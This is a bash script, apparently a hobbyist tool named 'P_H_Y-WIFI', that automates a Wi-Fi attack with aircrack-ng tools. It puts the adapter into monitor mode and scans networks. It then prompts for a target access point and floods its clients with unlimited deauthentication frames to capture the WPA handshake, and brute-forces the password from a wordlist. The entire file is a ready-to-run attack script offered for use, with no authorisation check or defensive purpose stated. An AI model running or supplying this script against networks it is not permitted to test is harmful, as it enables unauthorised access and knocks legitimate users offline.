
#!/bin/bash
#-----------------------------------------------------------------------
					#color codes
#-----------------------------------------------------------------------
clear

yellow='\033[1;33m'
nc='\033[0m'
red='\033[0;31m'
blue='\033[0;34m'
nono='\033[0;35m'

banner()
{
#-----------------------------------------------------------------------
									#banner
#-----------------------------------------------------------------------
echo -e "
${nono}	
	*=============================================================================================*
																								 
${yellow}    		 ██████╗    ██╗  ██╗     ██╗   ██╗    	  ${red} ██╗    ██╗██╗███████╗██╗	 
${yellow}    		 ██╔══██╗   ██║  ██║     ╚██╗ ██╔╝    	  ${red} ██║    ██║██║██╔════╝██║	 
${yellow}    		 ██████╔╝   ███████║      ╚████╔╝  █████╗  ${red}██║ █╗ ██║██║█████╗  ██║	 
${yellow}    		 ██╔═══╝    ██╔══██║       ╚██╔╝   ╚════╝  ${red}██║███╗██║██║██╔══╝  ██║	 
${yellow}    		 ██║███████╗██║  ██║███████╗██║        	  ${red} ╚███╔███╔╝██║██║     ██║	 
${yellow}    		 ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝             ${red}╚═╝  ╚═╝ ╚═╝╚═╝     ╚═╝    
																								 
			${blue}		@Author
						Name:	@ yuvi_white_hat , @ TPK_furious
						Mail:	@ yuvarajucet@gmail.com 	${nono}                                            																		 
	*=============================================================================================*
${nc}"
}


banner
#-----------------------------------------------------------------------
					#Funtions declaration
#-----------------------------------------------------------------------
				#checking for wireless device 
#-----------------------------------------------------------------------
check_wifi_adapter()
	{
	if [ -z "$check" ];then
		echo -e "${red}[-] ${nc}Wireless device not found!!"
		echo -e "${red}[-] ${nc}Please check your wireless Device!!!"
		echo -e "${red}[-] ${nc}Auto deduct can't find your Device please use Manual Mode"
		exit 0
	fi
}
check_wifi_adapter_man()
	{
	if [ -z "$check" ];then
		echo -e "${red}[-] ${nc}Wireless device not found!!"
		echo -e "${red}[-] ${nc}Please check your wireless Device!!!"
		echo -e "${red}[-] ${nc}Can't find Your interface. Please make sure wireless adapter connected or not!!!"
		exit 0
	fi	
	}
echo -e "${yellow}[+] ${nc}Choose interface Deduction Method"
echo -e "${yellow}1.${blue}Auto Deduct\n${yellow}2.${blue}Manual${nc}"
echo -e "${red}>>${nc}"
read option


#-----------------------------------------------------------------------
			#Option choose method condition
#-----------------------------------------------------------------------

if [ $option == "1" ];then
	{
#-----------------------------------------------------------------------
						#Loading Effect
#-----------------------------------------------------------------------
		echo -e "${yellow}[+] ${nc}Searching wireless device" 
		sleep 4 & PID=$! 
		printf "["
		while kill -0 $PID 2> /dev/null; do 
			printf  "."
			sleep 0.2
		done
		printf "]\n"
		sleep 0.5
		
#-----------------------------------------------------------------------
		#check if wifi-adapter connected or not
#-----------------------------------------------------------------------
		iwconfig wlan0 || iwconfig wlan0mon || check_wifi_adapter
		
		airmon-ng check kill  | sleep 3 | clear
		banner
		echo -e "${yellow}[+] ${nc}Wlan0 found"
		sleep 1
		echo -e "${yellow}[+]${nono} Killing Current process"
		sleep 1
		clear
#-----------------------------------------------------------------------
				#Enabling Monitor Mode
#-----------------------------------------------------------------------

		banner
		airmon-ng start wlan0 || airmon-ng start wlan0mon
		clear
		banner
		sleep 5
		echo -e "${yellow}[+]${nc} Enabling Monitor Mode"
#-----------------------------------------------------------------------
						#Loading Effect
#-----------------------------------------------------------------------
		sleep 4 & PID=$! 
		printf "["
		while kill -0 $PID 2> /dev/null; do 
			printf  "."
			sleep 0.2
		done
		printf "]\n"
		sleep 0.5
#-----------------------------------------------------------------------
		echo -e "${yellow}[+]${nc} Monitor mode enabled"
		sleep 1
		echo -e "${yellow}[+] ${nc}Scaning all Available wifi Network"
		sleep 1
		echo -e "${yellow}[+] ${nc}Wait 10seconds for scan the Available Networks"
		sleep 1
		echo -e "${yellow}[+] ${nc}After scan Hit [Ctrl + c] to exit scan mode"
		sleep 2
		clear
#-----------------------------------------------------------------------
					#Scanning the Available Networks
#-----------------------------------------------------------------------

		airodump-ng wlan0mon

		sleep 2

		echo -e "${yellow}[+] ${nc}After Handshake Hit ${red}[Ctrl + c] ${nc}to exit handshake"
#-----------------------------------------------------------------------
				#Getting handshake from the router
#-----------------------------------------------------------------------
#-----------------------------------------------------------------------
			#Get Target BSSID ,chennal and file location from user
#-----------------------------------------------------------------------

		echo -e "${yellow}[+] ${nc}BSSID for AP${red}:>>${nc}" 
		read bssid

		echo -e "${yellow}[+] ${nc}Chennal for AP${red}:>>${nc}" 
		read chennal

		echo -e "${yellow}[+] ${nc}Cap file Path & Name${red}:>>${nc}" 
		read filename
		sleep 2
		clear
#-----------------------------------------------------------------------
#Capture the packets from the AP and my request and Deauth the client
#-----------------------------------------------------------------------
		airodump-ng --bssid $bssid -c $chennal --write $filename wlan0mon | xterm -T "Deauthenticating | Handshake" -fa monaco -fs 10 -bg black -e "aireplay-ng --deauth 0 -a  $bssid wlan0mon"
		sleep 1
#-----------------------------------------------------------------------
				#Cracking the password using password list
#-----------------------------------------------------------------------

		echo -e "${yellow}Password file Path${red}:>>${nc}" 
		read passpath
		echo -e "${yellow}Cap file path${red}:>>${nc}"
		read file
#-----------------------------------------------------------------------
		#Cracking the password by brutefource method
#-----------------------------------------------------------------------
		aircrack-ng $file -w $passpath

	}
elif [ $option == "2" ];then
	{
		echo -e "${yellow}[::]${nc}Enter Interface name${red}>>${nc}"
		read inter
		#-----------------------------------------------------------------------
		#check if wifi-adapter connected or not
#-----------------------------------------------------------------------
		iwconfig $inter || iwconfig ${inter}mon || check_wifi_adapter
		
		airmon-ng check kill  | sleep 3 | clear
		banner
		echo -e "${yellow}[+] ${nc}$inter found"
		sleep 1
		echo -e "${yellow}[+]${nono} Killing Current process"
		sleep 1
		clear
#-----------------------------------------------------------------------
				#Enabling Monitor Mode
#-----------------------------------------------------------------------

		banner
		airmon-ng start $inter || airmon-ng start ${inter}mon
		clear
		banner
		sleep 5
		echo -e "${yellow}[+]${nc} Enabling Monitor Mode"
#-----------------------------------------------------------------------
						#Loading Effect
#-----------------------------------------------------------------------
		sleep 4 & PID=$! 
		printf "["
		while kill -0 $PID 2> /dev/null; do 
			printf  "."
			sleep 0.2
		done
		printf "]\n"
		sleep 0.5
#-----------------------------------------------------------------------
		echo -e "${yellow}[+]${nc} Monitor mode enabled"
		sleep 1
		echo -e "${yellow}[+] ${nc}Scaning all Available wifi Network"
		sleep 1
		echo -e "${yellow}[+] ${nc}Wait 10seconds for scan the Available Networks"
		sleep 1
		echo -e "${yellow}[+] ${nc}After scan Hit [Ctrl + c] to exit scan mode"
		sleep 2
		clear
#-----------------------------------------------------------------------
					#Scanning the Available Networks
#-----------------------------------------------------------------------

		airodump-ng ${inter}mon

		sleep 2

		echo -e "${yellow}[+] ${nc}After Handshake Hit ${red}[Ctrl + c] ${nc}to exit handshake"
#-----------------------------------------------------------------------
				#Getting handshake from the router
#-----------------------------------------------------------------------
#-----------------------------------------------------------------------
			#Get Target BSSID ,chennal and file location from user
#-----------------------------------------------------------------------

		echo -e "${yellow}[+] ${nc}BSSID for AP${red}:>>${nc}" 
		read bssid

		echo -e "${yellow}[+] ${nc}Chennal for AP${red}:>>${nc}" 
		read chennal

		echo -e "${yellow}[+] ${nc}Cap file Path & Name${red}:>>${nc}" 
		read filename
		sleep 2
		clear
#-----------------------------------------------------------------------
#Capture the packets from the AP and my request and Deauth the client
#-----------------------------------------------------------------------
		airodump-ng --bssid $bssid -c $chennal --write $filename ${inter}mon | xterm -T "Deauthenticating | Handshake" -fa monaco -fs 10 -bg black -e "aireplay-ng --deauth 0 -a  $bssid ${inter}mon"
		sleep 1
#-----------------------------------------------------------------------
				#Cracking the password using password list
#-----------------------------------------------------------------------

		echo -e "${yellow}Password file Path${red}:>>${nc}" 
		read passpath
		echo -e "${yellow}Cap file path${red}:>>${nc}"
		read file
#-----------------------------------------------------------------------
		#Cracking the password by brutefource method
#-----------------------------------------------------------------------
		aircrack-ng $file -w $passpath
		
	}

elif [ $option == "3" ];then
	echo -e "${red}[-] Wrong Option"
	exit 0
fi

#-----------------------------------------------------------------------
							#Thank you
#-----------------------------------------------------------------------
echo ""
echo -e "${yellow}[+]  ${nc}Thank you for using P_H_Y-WIFI"
